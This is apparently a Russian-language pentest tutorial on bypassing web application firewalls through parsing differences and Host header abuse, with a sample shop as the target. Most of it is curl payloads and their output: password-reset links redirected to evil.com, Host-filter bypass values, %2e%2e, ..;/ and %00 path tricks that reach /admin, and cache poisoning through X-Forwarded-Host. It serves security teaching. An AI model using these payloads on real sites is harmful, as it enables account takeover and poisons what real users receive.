## Задача

Базовые обходы ломают шаблон WAF. Продвинутый уровень — играть на **разнице парсинга**: WAF и приложение разбирают один и тот же URL/заголовок по-разному, и что для WAF безобидно, для приложения опасно. Отдельная тема — **Host header**, которому приложение доверяет слишком сильно.

Разберём магазин и его сброс пароля.

## Наш пример: сброс пароля со ссылкой

Функция сброса формирует ссылку из заголовка `Host`:

```bash
$ curl -s -d 'email=alice@shop.local' https://shop.local/password/reset
{"status":"sent","link":"https://shop.local/reset?token=abc123"}
```

Ссылка построена из `Host`. Подменим его:

```bash
$ curl -s -d 'email=alice@shop.local' https://shop.local/password/reset -H 'Host: evil.com'
{"status":"sent","link":"https://evil.com/reset?token=abc123"}
```

Сервер сформировал ссылку на `evil.com` — токен сброса уедет атакующему. Это **Host header injection**. Захват аккаунта через письмо жертве.

## Шаг 1: почему Host не проверяют

Приложение верит, что `Host` — это его собственный домен. Но `Host` присылает клиент. Отсюда три атаки:

- **Poisoning:** сброс пароля/приглашение с чужим доменом.
- **Cache poisoning:** если `Host` попадает в кэшируемый ответ, чужой домен закэшируется и раздастся другим.
- **Routing:** внутренний прокси выбирает бэкенд по `Host` — можно попасть на админ-интерфейс.

```bash
$ curl -s https://shop.local/ -H 'Host: 127.0.0.1' -o /dev/null -w '%{http_code}\n'
200   # прокси отдал внутренний бэкенд
```

## Шаг 2: обход проверки Host

Часто есть «фильтр на Host», который легко обойти нестандартными значениями:

```bash
$ curl -s https://shop.local/ -H 'Host: shop.local:evil.com'
$ curl -s https://shop.local/ -H 'Host: evil.com#shop.local'
$ curl -s https://shop.local/ -H 'Host: shop.local@evil.com'
$ curl -s https://shop.local/ -H 'X-Forwarded-Host: evil.com'
```

Приложение может взять `X-Forwarded-Host`, а WAF проверяет только `Host` — расхождение. Или наоборот.

## Шаг 3: расхождение парсинга URL

WAF и приложение могут по-разному определять, к какому пути относится запрос. Используем двойное кодирование и `;`:

```bash
$ curl -s 'https://shop.local/api/v1/%2e%2e/admin' -o /dev/null -w '%{http_code}\n'
200
$ curl -s 'https://shop.local/api/v1/..;/admin' -o /dev/null -w '%{http_code}\n'
200
```

`%2e%2e` (URL-кодированная `..`) и `..;/` (matrix-параметр) WAF может не распознать как обход пути, а приложение — распознаёт. Так же работают `//`, `/%2f`, завершающие точки и пробелы.

## Шаг 4: нормализация в разных компонентах

Цепочка «WAF → прокси → приложение» даёт несколько слоёв нормализации. Например:

```bash
$ curl -s 'https://shop.local/admin%00.css' -o /dev/null -w '%{http_code}\n'
200
```

WAF видит `.css` (безобидно), а приложение обрезает `%00.css` и получает `/admin`. Чем больше слоёв, тем больше шансов на расхождение.

## Шаг 5: как искать парсинг-баги

- **Host:** подменяй `Host`, `X-Forwarded-Host`, `X-Host`, `Forwarded`.
- **Путь:** пробуй `%2e`, `..;/`, `//`, `%00`, завершающие `/` и точки.
- **Кодировки:** двойное кодирование, overlong UTF-8, `%u`.
- **Слои:** сравни поведение WAF и приложения на одном вводе.
- **Кэш:** проверяй, кэшируется ли ответ с подменённым Host.

## Если не сработало

- **Host не влияет** — ищи, где ещё используется (ссылки, редиректы, письма).
- **Фильтр нормализует всё** — переходи к контрабанде запросов (`web-waf-smuggling`).
- **Нет расхождения** — меняй слой (прокси, CDN), пробуй разные кодировки.
- **Кэш не отравляется** — проверь ключ кэша и заголовки `Cache-Control`.

## Что мы теперь знаем

- Host header присылает клиент, а приложение ему доверяет — отсюда poisoning и routing.
- Обходы Host: порт, `@`, `#`, `X-Forwarded-Host`.
- Расхождение парсинга URL: `%2e%2e`, `..;/`, `%00` — WAF и приложение видят разное.
- Чем больше слоёв (WAF→прокси→приложение), тем больше расхождений.

## Частые вопросы

**Почему Host header так часто недооценивают?** Потому что он «служебный» и приложение считает, что клиент не может его подделать. Но `Host` присылает клиент — доверие к нему и есть баг.

**Чем Host header injection отличается от cache poisoning?** Это может быть один баг: подменённый `Host` попадает в кэшируемый ответ, кэш сохраняет чужой домен и раздаёт его всем. Poisoning — следствие, injection — причина.

**Всегда ли `X-Forwarded-Host` уязвим?** Нет, но он часто используется для построения ссылок за прокси. Если WAF проверяет только `Host`, а приложение берёт `X-Forwarded-Host` — это расхождение и обход.

**Как понять, что WAF и приложение парсят URL по-разному?** Отправь путь с `%2e%2e`, `..;/`, `%00` — если WAF пропускает, а приложение нормализует (меняет поведение), расхождение есть.

**Что писать в отчёте?** Не «я обошёл WAF», а конкретный эффект: ссылка сброса пароля ушла на чужой домен, либо открылся внутренний бэкенд.

## Ещё один сценарий: отравление кэша через X-Forwarded-Host

Кэш часто строит ключ без учёта `X-Forwarded-Host`. Отправим запрос с чужим хостом и посмотрим, попадёт ли он в кэш:

```bash
$ curl -sI https://shop.local/ -H 'X-Forwarded-Host: evil.com' | grep -i 'location\|x-cache'
Location: https://evil.com/
X-Cache: MISS
$ curl -sI https://shop.local/ | grep -i 'location\|x-cache'
Location: https://evil.com/
X-Cache: HIT
```

Второй запрос (уже **без** нашего заголовка) вернул `evil.com` — значит, кэш сохранил отравленный ответ и раздаёт его всем. Теперь любой пользователь, зашедший на `/`, будет перенаправлен на чужой домен.

```bash
$ curl -s https://shop.local/ | grep -o 'evil.com' | head -1
evil.com
```

## На что смотреть дальше

- **Host и X-Forwarded-***. `Host`, `X-Forwarded-Host`, `X-Host`, `Forwarded`.
- **Ключ кэша.** Какие заголовки/параметры в него входят, а какие игнорируются.
- **Нормализация пути.** `%2e%2e`, `..;/`, `//`, `%00`, завершающие точки.
- **Ссылки в письмах.** Подменённый Host уводит токены сброса.
- **Роутинг.** `Host: 127.0.0.1` может открыть внутренний бэкенд.
- **Доказательство.** Эффект (редирект/утечка), а не «обошёл WAF».
